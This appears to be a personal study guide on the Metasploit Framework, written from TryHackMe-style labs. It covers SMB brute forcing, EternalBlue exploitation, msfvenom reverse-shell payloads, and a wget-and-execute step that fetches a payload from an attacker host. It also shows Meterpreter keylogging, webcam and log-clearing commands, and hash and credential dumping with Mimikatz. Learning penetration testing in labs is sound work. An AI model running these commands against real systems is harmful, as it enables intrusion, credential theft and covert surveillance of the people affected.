# Metasploit Framework
Comprehensive guide to Metasploit penetration testing tools and exploitation techniques (Aug 2026)

## Overview
So it is mainly focused on penetration testing. It is set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation and more.
Main components of the metasploit framework is:-
- msfconsole: main command line interface
- modules: supporting modules such as exploits, scanners, payloads etc.

***Some terms***

**Exploitation:** Using the flaw or vulnerability to gain unauthorized access.
**Payload:** These are codes that will run on the target system.

The metasploit console can be used just like a regular command-line shell.

***Key Navigation commands:***
- `search <term>` -> finds modules in metasploit's database.
- `use <name or #>` -> selects an exploit or scanner to work with.
- `show options` -> lists all settings required to run the current module (IPs, ports, target OS)
- `set <option> <val>` -> configure a required setting (eg: set RHOSTS TARGET_IP)
- `info` -> shows full details about the active module (who wrote it, how it works, CVE numbers)
- `show payloads` -> lists all compatible malicious code options you can send to the target once exploited.

There are 5 command prompts we need to check :-
- `root@ip-<val>:~#` -> linux terminal
- `msf6>` -> metasploit main menu
- `msf6 exploit(...)>` -> module content
- `meterpreter>` -> meterpreter context
- `C:\Windows\system32>` -> target os shell

***Core metasploit variables:***

- **RHOSTS:**  remote host -> the target machine's IP address (set RHOSTS TARGET_IP)
- **RPORT:**  remote port -> the port running the target services (set RPORT 445)
- **LHOST:** local host -> Our attacking machine's IP addr (set LHOST YOUR_IP)
- **LPORT:**  local port -> the open port on our machine waiting for the incoming connection (set LPORT 4444)
- **PAYLOAD:** the specific shell code delivered to target once the vulnerability is triggered (set PAYLOAD windows/x64/meterpreter/reverse_tcp)

***Management & Global commands:***

- `unset <option>/ unset all`:  clears a specific variable or resets all variables in the active module (unset PAYLOAD -> clear a set payload)
- `setg <option> <value>`:  Sets a Global Variable. If we set setg RHOSTS TARGET_IP, Metasploit automatically populates RHOSTS for every module we load afterward until we exit msfconsole. (setg RHOSTS TARGET_IP)
- `exploit (or run)`:  Launches the active attack.
- `exploit -z`:  Runs the exploit and automatically puts the new connection into the background without dropping us straight into the interactive shell.

***Managing Sessions (Connections):***
When an exploit succeeds, it opens an active Session (a live tunnel between our PC and the victim):
- `background (or CTRL+Z)`: Temporarily leaves an active session without closing it, putting us back in the Metasploit terminal.
- `sessions`: Lists all open, active compromised connections on target hosts.
- `sessions -i <ID>`: Re-enters a backgrounded session (e.g., sessions -i 2 jumps back into Session #2).


***EternalBlue Example***
Successfully demonstrated MS17-010 exploitation using Metasploit:
- Used `exploit/windows/smb/ms17_010_eternalblue` module
- Gained SYSTEM shell via Meterpreter
- Demonstrated process enumeration and system information gathering


Now, we will start by port scanning for metasploit.

```bash
search portscan
```
We can do nmap on the target or use any of the listed in above command. Something important things to note that nmap scan 1000 most used ports, while metasploit will scan port numbers from 1 to 10000.

```bash
nmap -sS <IP>
```
The flag '-sS' enables a TCP SYN scan, which is commonly known as stealth scan or half-open scan. Unlike a full 3 way handshake, it intentionally cuts the connection. It sends a SYN packet to specific port:-
- If the port is open then it sends SYN/ACK packet.
- If the port is closed, the target responds with a RST packet.
- If the target is protected by firewall, the packet is often dropped, resulting in a filtered status.

After scanning the target we find netBIOS name using the module `auxiliary/scanner/netbios/nbname`. NetBIOS is just the computer name on Windows/SMB network.
NetBIOS is an old windows networking protocol. Every windows computer broadcasts its name via NetBIOS on the network.
The NetBIOS name reveals:
- Computer name -> what is this machine called?
- Workgroup/Domain -> Which network does it belong to?
- Services running -> What's available on the network?
It matters for cybersecurity:
- Identifies target (we now know what machine we are attacking)
- Reconnaissance (gather info about the network)
- Social engineering (computer name can hint at purpose or owner) 

After that brute forcing in smb over port 445 using module `auxiliary/scanner/smb/smb_login`, and set following things that needed for this attack.
```bash
$ set RHOSTS <IP>
$ set SMBUser "penny"
$ set PASS_FILE MetasploitWordlist-1632491116676.txt
$ run
```

It will reveal the password by brute forcing from the wordlists.


### Metasploit database 
Why we use it?

When we are doing a real penetration test with 10+ targets, mananging IPs, open ports and finding manually is chaos.

**Database setup**
- postgresql stores all our scan data.
- `msfdb init` -> initializes it
- `db_status` -> checks if connected.

**Workspaces**
- Separate projects/clients into different workspaces.
- Each workspaces -> isolated data
```bash
workspace -a tryhackme  # create new workspace
workspace tryhackme     # switch to it
workspace               # list all
workspace -d tryhackme  # deletes the database
```

**Automated Scanning & Storage**
- db_nmap runs nmap and automatically saves results
- All hosts, ports, services stored in database
- No manual copy-pasting
```bash
db_nmap -sV -p- <Target_IP>
```

**Querying Results**
- hosts -> List all discovered hosts
- services -> List all open services
- services -S netbios -> Search for specific services

**Quick Target Selection**
- hosts -R -> Automatically sets RHOSTS from database
- No manual IP entry needed

example:-
```bash
msf6 > db_nmap -sV <Target_IP>               # Scan and save
msf6 > services -S microsoft-ds              # Find SMB hosts
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > hosts -R                              # Auto-set RHOSTS
msf6 > run                                   # Scan all hosts at once
```

We can also use different types of payloads to execute in target machine:
```bash
show payloads    # it will list all payloads for any module
```

Once we decided a payload, we can use
```bash
set payload <number from the list>
```

Some payloads may need to set new parameters, running `show options` will list those.
After executing a payload to the target, we can abort it (ctrl C) or background it (ctrl Z).

```bash
sessions
```
The above command will list all active sessions. we can use `sessions -h` which can help us manage sessions. We can use `sessions -i <Id>` to interact with any existing session.

So now we will exploit port 445 or port 139, where MS17-010 affects both.

```bash
search MS17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target_IP>
set LHOST <Your IP>
run
```
After gaining cmd shell, run:
```bash
cd C:\\
cd Users
cd Jon
dir flag.txt /s
```
After that we use another payload for using meterpreter
```bash
use payload 30
cd /
hashdump
```

### MSFvenom
Msfvenom is a tool that creates malicious payloads. It will allow us to access all payloads available in Metasploit framework. Also it allow us to create payloads in many different formats (PHP, dll,elf,exe etc) and for many different target systems (Windows, Linux, Apple, Android etc).

**3 main things it does:**
- Create payloads -> generate executable code (reverse shells, meterpreter shells etc)
- Multiple formats -> Can output as .exe, .elf, .php, .py etc
- Multiple targets -> Workds for windows, linux, andorid, apple etc


**Supported formats and platforms:**

| OS | Output formats |
|---|---|
| Windows | .exe |
| Linux | .elf |
| Android | .apk |
| IIS web servers | .asp |

Raw scripting formats:- Python, PHP, Javascript, C, Perl.


**List supported options**
```bash
msfvenom -l payloads         # List payloads
msfvenom --list formats      # List formats
msfvenom --list encoders     # listing encoders
```

**Encoders:**
Encoders encode payload bytes to bypass bad characters or simple filters. Modern Antivirus detection often requires specialized obfuscation technique rather than basic encoding alone.

### Generate payload for PHP 
**Step 1: Generate payload with MSFvenom**
```bash
msfvenom -p php/reverse_php LHOST=<IP> LPORT=7777 -f raw > shell.php
```
Here `-p` is for payload type (php/reverse_php), LHOST for machine IP of attacker with LPORT (7777), `-f` tells for output formats (raw, exe, elf etc), `>` saves in a file.

**Step 2: Start a listener (MultiHandler)**
```bash
msf6> use exploit/multi/handler
msf6> set payload php/reverse_php
msf6> set lhost <Your_IP>
msf6> set lport 7777
msf6> run
```
This waits for the target to connect back to our machine.

**Step 3: Execute payload on the target**
Upload the generated `shell.php` to target and execute it.

**Step 4: Get shell**
When target runs the payload, it connects back to our listener and we get a shell.



### Common payloads:
- Windows: windows/meterpreter/reverse_tcp → generates .exe file
- Linux: linux/x86/meterpreter/reverse_tcp → generates .elf file
- PHP: php/reverse_php → generates .php file (for web servers)
- Python: cmd/unix/reverse_python → generates .py file


### TARGET : LINUX/x86 machine
Now we want to gain reverse shell on target machine which is a linux/x86 machine.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=7777 -f elf > rev_shell.elf     # Generate Linux ELF payload
```

Start a python server on attacker machine to get the file from victim machine.
```python
python3 -m http.server 9000
```

Prepare and launch the attack
```bash
msfconsole -q
msf6> use exploit/multi/handler
msf6> exploit(multi/handler)> set payload linux/x86/meterpreter/reverse_tcp
msf6> exploit(multi/handler)> set lhost <ATTACKER_IP>
msf6> exploit(multi/handler)> set lport 7777
msf6> exploit(multi/handler)> run
```

Execute on Target Machine
```bash
cd /tmp
wget http://<ATTACKER_IP>:9000/rev_shell.elf
chmod +x rev_shell.elf
./rev_shell.elf
```

We will gain a meterpreter shell, after that we can use various commands to know about the system.
```
sysinfo     # to see info about OS version, kernel version, installed software, patch level
getuid      # to see if we are running as root or regular user
pwd
ls          # to see if sensitive info 
```

Privilege Escalation & Hash Dump inside Target Shell
```
shell
echo "1q2w3e4r" | sudo -S -l
echo "1q2w3e4r" | sudo -S cat /etc/shadow    # -S causes sudo to read the password from standard input instead of the terminal device
``` 

If `sudo -l -l` say /bin/bash, then we can run `sudo /bin/bash` as root.

## Meterpreter
Meterpreter is a remote agent that runs inside a process on the target machine.

When executed the meterpreter payload, it loads into RAM. Doesn't create a file like meterpreter.exe on the target's hard drive. The feature aims to avoid being detected during antivirus scans. Most antivirus software scans new files on disk. It also doesn't run as its own process, instead it injects itself into an existing, legitimate process. All the traffic between attacking machine and target is encrypted via TLS. IDS/IPS systems can't see what's happening inside the encrypted tunnel.

### Meterpreter commands:
Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.

**Core commands**
- background: Backgrounds the current session
- exit: Terminate the Meterpreter session
- guid: Get the session GUID (Globally Unique Identifier)
- help: Displays the help menu
- info: Displays information about a Post module
- irb: Opens an interactive Ruby shell on the current session
- load: Loads one or more Meterpreter extensions
- migrate: Allows you to migrate Meterpreter to another process
- run: Executes a Meterpreter script or Post module
- sessions: Quickly switch to another session

**File system commands**
- cd: Will change directory
- ls: Will list files in the current directory (dir will also work)
- pwd: Prints the current working directory
- edit: will allow you to edit a file
- cat: Will show the contents of a file to the screen
- rm: Will delete the specified file
- search: Will search for files
- upload: Will upload a file or directory
- download: Will download a file or directory

**Networking commands**
- arp: Displays the host arp(Address Resolution Protocol) cache
- ifconfig: Displays network interfaces available on the target system
- netstat: Displays the network connections
- portfwd: Forwards a local port to a remote service
- route: Allows you to view and modify the routing table

**System commands**
-clearev: Clears the event logs
-execute: Executes a command
-getpid: Shows the current process identifier
-getuid: Shows the user that Meterpreter is running as
-kill: Terminates a process
-pkill: Terminates processes by name
-ps: Lists running processes
-reboot: Reboots the remote computer
-shell: Drops into a system command shell
-shutdown: Shuts down the remote computer
-sysinfo: Gets information about the remote system, such as OS

**Others Commands (these will be listed under different menu categories in the help menu)**
- idletime: Returns the number of seconds the remote user has been idle
- keyscan_dump: Dumps the keystroke buffer
- keyscan_start: Starts capturing keystrokes
- keyscan_stop: Stops capturing keystrokes
- screenshare: Allows you to watch the remote user's desktop in real time
- screenshot: Grabs a screenshot of the interactive desktop
- record_mic: Records audio from the default microphone for X seconds
- webcam_chat: Starts a video chat
- webcam_list: Lists webcams
- webcam_snap: Takes a snapshot from the specified webcam
- webcam_stream: Plays a video stream from the specified webcam
- getsystem: Attempts to elevate your privilege to that of local system
- hashdump: Dumps the contents of the SAM database

**Example:**
- getuid -> NT AUTHORITY\SYSTEM -> highest priviledge
- migrate 716 moves meterpreter from PID <OLDER_PID> to PID 716. Some process have better capabilitites.

Meterpreter is inside a process. The process has a security context (the user/privileges it runs as). If Meterpreter migrates into a low-privilege process, it inherits that process's security context. Once it's moved, it can't just climb back up, it's now trapped in that low-privilege container.

### Post exploitation modules
**load command:**
- loads additional extensions/mdoules into your current meterpreter session.
- ex:- load python, load kiwi
- once loaded, new commands appear in help menu

**load python:**
- lets you execute python code directly from meterpreter.
```bash
python_execute "print 'Hello Friend!'"
```

**load kiwi (Mimikatz):**
- loads mimikatz, a famous windows credential extraction tool
commands:
```bash
creds_all      # extract all stored credentials
creds_msv      # grab NTLM hashes
lsa_dump_sam   # dump SAM database
golden_ticket_create    # create forged kerberos tickets
wifi_list      # steal wifi credentials
```

**Questions**
```bash
sudo nmap -sC -sV -O <Target_IP>  # This will reveal open ports, OS and computer name
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set SMBUser ballen
set SMBPass Password1
run
```

```bash
meterpreter > sysinfo   # instead of nmap, reveals computer name and domain
meterpreter > CTRL Z
```

For share names enumeration
```bash
use post/windows/gather/enum_shares
set session <Your session number according to the meterpreter session>
sessions -i 1
run
```

**Decision logic:** 
Now we have to migrate to a x64 process, because current meterpreter running in x86 while the architecture is x64. So we have to move to stable, NT AUTHORITY\SYSTEM and x64 process. We will choose svchost.exe as it is safer because it is one of many instances, and even if it crashes others will keep the system running.

```bash
meterpreter > ps
meterpreter > migrate 340
meterpreter > hashdump
```
**NTLM hash format:** username:RID:LM_hash:NTLM_hash:::

```bash
meterpreter > load kiwi
meterpreter > creds_all
```

**Decision logic:**
Since jchambers isn't logged in, it won't show his credentials. So we will use crackstation.net for the NTLM hash.

```bash
meterpreter > search -f secrets.txt
meterpreter > shell
```
Go to the directory mentioned in search -f command
```
cd <FULL_DIRECTORY_PATH>
dir
type secrets.txt
```

Now for the realsecret.txt
```bash
meterpreter > search -f realsecret.txt
```
And same as above.